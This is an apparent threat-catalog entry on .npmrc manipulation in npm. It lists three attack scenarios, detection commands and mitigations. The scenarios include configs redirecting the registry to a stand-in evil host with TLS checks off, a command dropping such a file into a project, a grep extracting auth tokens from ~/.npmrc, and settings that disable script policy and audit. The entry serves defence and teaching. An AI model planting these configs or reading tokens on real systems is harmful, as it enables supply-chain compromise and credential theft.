---
name: ".npmrc Manipulation"
packageManager: "npm"
slug: "npm-npmrc-manipulation"
category: "Configuration Abuse"
severity: "medium"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: ".npmrc files control npm behavior including registry URLs, authentication, TLS checks, and install-policy settings. An attacker with write access to a project or user-level .npmrc can redirect package resolution, weaken transport checks, or override npm 12's safer dependency defaults. npm loads configuration from project, user, global, and built-in locations with defined precedence, so defenders need to inspect the effective configuration as well as individual files."
descriptionCitations: [1, 2, 3, 4]
prerequisites:
  - "Write access to the target filesystem (project directory, user home directory, or global npm config)"
  - "Target must subsequently run npm install or similar npm commands"
prerequisitesCitations: [1, 2, 3, 4]
attackScenarios:
  - title: "Redirecting Registry to a Malicious Server"
    description: "An attacker with write access to the project directory places a .npmrc file that points the npm registry to an attacker-controlled server. All subsequent npm install commands will fetch trojanized packages from the malicious registry instead of the official one."
    citations: [1, 2, 3, 4]
    commands:
      - label: "Malicious .npmrc redirecting the default registry"
        code: |
          registry=https://evil-registry.example.com/
          strict-ssl=false
        language: "ini"
      - label: "Dropping the malicious .npmrc into a project"
        code: |
          echo -e "registry=https://evil-registry.example.com/\nstrict-ssl=false" > /path/to/project/.npmrc
        language: "bash"
  - title: "Stealing npm Auth Tokens"
    description: "If a developer's ~/.npmrc contains an auth token for publishing packages, an attacker with read access to the home directory can extract the token and use it to publish malicious versions of the developer's packages."
    citations: [1, 2, 3, 4]
    commands:
      - label: "Extracting auth tokens from ~/.npmrc"
        code: |
          cat ~/.npmrc | grep '_authToken'
          # Output: //registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXX
        language: "bash"
  - title: "Disabling Security Controls via .npmrc"
    description: "An attacker modifies .npmrc to bypass npm 12's dependency script policy, allow Git or remote URL dependencies, disable strict TLS verification, and suppress audit submission. These settings broaden the code and sources an install may accept."
    citations: [1, 2, 3, 4]
    commands:
      - label: ".npmrc that disables security protections"
        code: |
          dangerously-allow-all-scripts=true
          allow-git=all
          allow-remote=all
          strict-ssl=false
          audit=false
        language: "ini"
detection:
  - title: "Audit .npmrc Files Across All Locations"
    description: "Regularly check for .npmrc files in project directories, user home directories, and global npm config paths. Verify that registry URLs point to expected registries and that no unexpected auth tokens are present."
    citations: [1, 2, 3, 4]
    commands:
      - code: "npm config list -l 2>/dev/null | grep -E 'registry|_authToken|strict-ssl|ignore-scripts|allow-scripts|allow-git|allow-remote'"
        language: "bash"
      - code: "find / -name '.npmrc' -type f 2>/dev/null | head -20"
        language: "bash"
  - title: "Monitor .npmrc Changes in Version Control"
    description: "Ensure .npmrc files in project repositories are tracked in version control and changes are reviewed. Use CI/CD checks to validate that the registry URL has not been tampered with."
    citations: [1, 2, 3, 4]
    commands:
      - code: "git diff HEAD -- .npmrc"
        language: "bash"
mitigation:
  - "Track .npmrc files in version control and require code review for any changes to registry or auth settings"
  - "Never store auth tokens in project-level .npmrc files; use environment variables or npm login sessions instead"
  - "Enforce strict-ssl=true and verify registry URLs in CI/CD pipeline pre-checks"
  - "Reject dangerously-allow-all-scripts=true and broad allow-git or allow-remote settings in managed configurations"
  - "Use file integrity monitoring to detect unauthorized changes to .npmrc in developer home directories"
  - "Restrict filesystem write access on CI/CD build agents to prevent unauthorized .npmrc placement"
mitigationCitations: [1, 2, 3, 4]
references:
  - title: "npm .npmrc Configuration Documentation"
    url: "https://docs.npmjs.com/cli/v12/configuring-npm/npmrc"
  - title: "npm Config Settings Reference"
    url: "https://docs.npmjs.com/cli/v12/using-npm/config"
  - title: "Securing the npm Supply Chain - GitHub Blog"
    url: "https://github.blog/security/supply-chain-security/"
  - title: "npm 12 Configuration Reference"
    url: "https://docs.npmjs.com/cli/v12/using-npm/config/"
created: 2026-04-02
updated: 2026-10-14
---
